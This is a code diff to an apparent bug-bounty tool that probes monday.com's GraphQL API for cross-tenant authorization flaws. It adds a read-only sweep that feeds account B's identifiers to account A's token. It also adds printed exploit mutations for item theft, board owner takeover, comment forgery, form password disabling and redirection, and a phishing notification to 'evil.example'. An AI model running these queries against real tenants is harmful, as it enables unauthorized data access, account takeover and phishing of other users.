@@ -9,10 +9,16 @@ the monday.com GraphQL API.
     python3 gqlprobe.py checks          # GQL-02, GQL-03, GQL-10 on your own account
     python3 gqlprobe.py all
 
-Cross-tenant (the only way to prove a real finding) needs a second account:
+Cross-tenant is the only thing that turns any of this into a finding. Make a second
+free account, collect its identifiers, then point THIS account's token at them:
 
-    export MONDAY_TOKEN_B='<token of account B>'
-    python3 gqlprobe.py crosstenant --b-account 123 --b-user 456 --b-board 789
+    python3 gqlprobe.py idor --b-asset 998877 --b-board 12345 --b-account 678 \
+                            --b-item 111 --b-update 222 --connection-id 900
+    python3 gqlprobe.py crosstenant --b-account 678 --b-user 456 --b-board 12345
+
+`idor` is the read-only BOLA sweep from reports/idor-analysis.md - assets, billing,
+boards, items, updates, docs, webhooks, connections, aggregates. A hit there is
+reportable on its own.
 
 READ-ONLY BY DESIGN. This tool sends queries, never mutations. The mutation-based
 findings (GQL-06 agent takeover, GQL-07 user admin, GQL-09 billing) change state,
@@ -422,6 +428,118 @@ def cmd_crosstenant(args):
     print(f"  in account B. A hit is a cross-tenant index leak.{C_0}")
 
 
+def cmd_idor(args):
+    """
+    Read-only BOLA sweep: hand account A's token an identifier from account B and
+    see what comes back. Every query here is a read - nothing is copied, moved or
+    modified. The write-side IDORs (duplicate_item, add_users_to_board) are in
+    `mutations` for you to run by hand.
+    """
+    print(f"\n{C_B}=== IDOR sweep: your token, account B's identifiers ==={C_0}")
+    print(f"{C_D}  Anything that returns data here crosses the tenant boundary.{C_0}\n")
+
+    checks = []
+    if args.b_asset:
+        checks.append(("assets(ids:) - IDOR-01, the best one",
+                       '{ assets(ids: ["%s"]) { id name file_extension file_size '
+                       'public_url uploaded_by { id name email } } }' % args.b_asset,
+                       "public_url is a working download link, valid 1h"))
+    if args.b_account:
+        checks += [
+            ("app_subscriptions(account_id:) - IDOR-02",
+             '{ app_subscriptions(app_id: "%s", account_id: %s) { total_count '
+             'subscriptions { account_id plan_id monthly_price currency renewal_date '
+             'max_units } } }' % (args.app_id or "10000005", args.b_account),
+             "another account's billing"),
+            ("app_installs(account_id:)",
+             '{ app_installs(app_id: "%s", account_id: "%s") { app_id timestamp '
+             'app_install_account { id } permissions { approved_scopes } } }'
+             % (args.app_id or "10000005", args.b_account),
+             "which apps another account installed"),
+        ]
+    if args.b_board:
+        checks += [
+            ("boards(ids:)",
+             '{ boards(ids: ["%s"]) { id name description permissions '
+             'items_count owners { id name email } } }' % args.b_board,
+             None),
+            ("webhooks(board_id:) - endpoint config",
+             '{ webhooks(board_id: "%s") { id event config } }' % args.b_board, None),
+            ("export_graph(boardId:)",
+             '{ export_graph(boardId: "%s") { boardId nodeCount edgeCount } }'
+             % args.b_board, None),
+            ("board_dependencies(board_id:)",
+             '{ board_dependencies(board_id: "%s", limit: 2) { total_count } }'
+             % args.b_board, None),
+            ("aggregate over B's board - IDOR-09",
+             '{ aggregate(query: { from: { type: TABLE, id: "%s" }, select: '
+             '[{ type: FUNCTION, function: { function: COUNT_ITEMS }, as: "n" }] }) '
+             '{ results { entries { alias } } } }' % args.b_board,
+             "aggregates can leak values you cannot select"),
+        ]
+    if args.b_item:
+        checks.append(("items(ids:)",
+                       '{ items(ids: ["%s"]) { id name email url board { id name } '
+                       'column_values { id text } } }' % args.b_item, None))
+    if args.b_update:
+        checks.append(("updates(ids:) - comment bodies",
+                       '{ updates(ids: ["%s"]) { id body text_body creator { id name email } } }'
+                       % args.b_update, None))
+    if args.b_doc:
+        checks.append(("docs(ids:)",
+                       '{ docs(ids: ["%s"]) { id name url blocks(limit: 3) { id content } } }'
+                       % args.b_doc, None))
+    if args.b_form_token:
+        checks.append(("form(formToken:) - IDOR-08 read side",
+                       '{ form(formToken: "%s") { id token title active isAnonymous '
+                       'questions { id title type } } }' % args.b_form_token,
+                       "the read path documents a board-access requirement"))
+    if args.connection_id:
+        checks.append(("connection(id:) - IDOR-03",
+                       '{ connection(id: %s) { id accountId userId provider '
+                       'providerAccountIdentifier state } }' % args.connection_id,
+                       "walk the integer space to map integrations"))
+
+    if not checks:
+        print(f"  {C_R}nothing to test.{C_0} Give at least one of:")
+        print(f"  {C_D}--b-asset --b-account --b-board --b-item --b-update --b-doc")
+        print(f"  --b-form-token --connection-id{C_0}")
+        print(f"\n  Get them by running `whoami` and the normal queries with"
+              f" MONDAY_TOKEN_B,\n  or from account B's URLs.")
+        return []
+
+    hits = []
+    for label, q, note in checks:
+        st, body, raw = gql(q, args.token, timeout=args.timeout)
+        verdict, detail = classify(st, body, raw)
+        extra = ""
+        if verdict == "EXISTS":
+            extra = f"{C_R}{C_B}!! CROSS-TENANT READ{C_0}"
+            hits.append((label, q, body))
+        elif note:
+            extra = f"{C_D}{note}{C_0}"
+        show(label, verdict, detail, extra)
+        if verdict == "EXISTS":
+            print(f"{C_D}{json.dumps(body.get('data'), indent=2)[:500]}{C_0}")
+        if verdict == "RATELIMIT":
+            time.sleep(args.delay * 6)
+        time.sleep(args.delay)
+
+    print(f"\n{C_B}--- {len(hits)} cross-tenant hit(s) ---{C_0}")
+    if hits:
+        print(f"  {C_R}These are reportable. For each one, capture:{C_0}")
+        print(f"    1. the exact request (query + which token)")
+        print(f"    2. the response showing data you do not own")
+        print(f"    3. proof the object belongs to the other account")
+        print(f"    4. for assets: fetch the public_url and show the file contents")
+        for label, q, _ in hits:
+            print(f"\n  {label}\n  {C_D}{q}{C_0}")
+    else:
+        print(f"  {C_G}Nothing crossed. Object-level authorisation is holding on"
+              f" everything tested.{C_0}")
+    return hits
+
+
 def cmd_mutations(args):
     """Print, never send."""
     print(f"\n{C_B}=== state-changing checks - RUN THESE BY HAND ==={C_0}")
@@ -429,6 +547,48 @@ def cmd_mutations(args):
     print(f"OWN accounts first so you know what success looks like.{C_0}\n")
 
     blocks = [
+        ("IDOR-05  item theft - duplicate_item (non-destructive, test this first)",
+         "Two ids, two possible owners. If only the destination board is authorised, "
+         "you pull another tenant's item - with its whole comment history - onto yours.",
+         'mutation {\n'
+         '  duplicate_item(board_id: "<YOUR BOARD>", item_id: "<THEIR ITEM>",\n'
+         '                 with_updates: true) { id name url board { id name } }\n'
+         '}\n\n'
+         '# the destructive twin - own accounts only:\n'
+         '# move_item_to_board(board_id: "<YOURS>", group_id: "<YOURS>", item_id: "<THEIRS>")'),
+        ("IDOR-06  board takeover - add yourself as owner",
+         "Highest severity here. Run against a board on your OWN second account.",
+         'mutation {\n'
+         '  add_users_to_board(board_id: "<BOARD YOU CANNOT ACCESS>",\n'
+         '                     user_ids: ["<YOUR USER ID>"], kind: owner) { id name }\n'
+         '}\n\n'
+         '# same operation on the newer Objects Platform - may not share the checks:\n'
+         'mutation { add_subscribers_to_object(id: "<OBJECT>", user_ids: ["<YOU>"],\n'
+         '                                     kind: OWNER) { id name } }'),
+        ("IDOR-07  edit someone else's comment",
+         "Content forgery: edited_at and creator stay unchanged, so it is not obvious.",
+         'mutation { edit_update(id: "<UPDATE NOT YOURS>", body: "edited") '
+         '{ id body creator { id name } edited_at } }'),
+        ("IDOR-08  rewrite a form using only its public token",
+         "The form QUERY documents a board-access requirement; the mutations do not. "
+         "Use a second account that was never given access to the form's board.",
+         '# disable password protection\n'
+         'mutation { update_form_settings(formToken: "<TOKEN FROM A FORM URL>",\n'
+         '  settings: { features: { password: { enabled: false } } }) { id token active } }\n\n'
+         '# redirect submitters to your own site\n'
+         'mutation { update_form_settings(formToken: "<TOKEN>", settings: { features: {\n'
+         '  afterSubmissionView: { redirectAfterSubmission: { enabled: true,\n'
+         '    redirectUrl: "https://your-site.example/x" } } } }) { id } }'),
+        ("ABUSE-01  arbitrary in-app notification (phishing)",
+         "Does user_id have to be in your account? Does text render links or markup?",
+         'mutation { create_notification(user_id: "<TARGET USER>", target_id: "<ITEM>",\n'
+         '  target_type: Project, text: "Your session expired: https://evil.example")\n'
+         '  { id text } }'),
+        ("ABUSE-02  creator spoofing (documented as admin-only - test as a MEMBER)",
+         "create_timeline_item's user_id says 'Only for account admins'. Test the claim.",
+         'mutation { create_timeline_item(item_id: "<ITEM>", user_id: <SOMEONE ELSE>,\n'
+         '  title: "spoofed", timestamp: "2026-01-01T00:00:00Z",\n'
+         '  custom_activity_id: "<ID>") { id title user { id name } } }'),
         ("GQL-06  agent takeover via optional agent_id",
          "Repoint another agent's callback_url; the response hands back its new signing_secret.",
          'mutation {\n'
@@ -484,14 +644,17 @@ def main():
     ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
     ap.add_argument("command",
-                    choices=["whoami", "probe", "checks", "crosstenant", "mutations", "all"])
+                    choices=["whoami", "probe", "checks", "idor", "crosstenant",
+                             "mutations", "all"])
     ap.add_argument("--token", default=os.environ.get("MONDAY_TOKEN"))
     ap.add_argument("--delay", type=float, default=1.0,
                     help="seconds between requests (default 1)")
     ap.add_argument("--timeout", type=float, default=30)
-    ap.add_argument("--b-account"), ap.add_argument("--b-user")
-    ap.add_argument("--b-board"), ap.add_argument("--a-board")
-    ap.add_argument("--b-service-user")
+    # identifiers from the OTHER account - this is what makes a finding a finding
+    for a in ("--b-account", "--b-user", "--b-board", "--b-item", "--b-update",
+              "--b-doc", "--b-asset", "--b-form-token", "--b-service-user",
+              "--connection-id", "--app-id", "--a-board"):
+        ap.add_argument(a)
     args = ap.parse_args()
 
     if args.command == "mutations":
@@ -509,6 +672,8 @@ def main():
         cmd_probe(args)
     if args.command in ("checks", "all"):
         cmd_checks(args)
+    if args.command in ("idor", "all"):
+        cmd_idor(args)
     if args.command == "crosstenant":
         cmd_crosstenant(args)
     if args.command == "all":
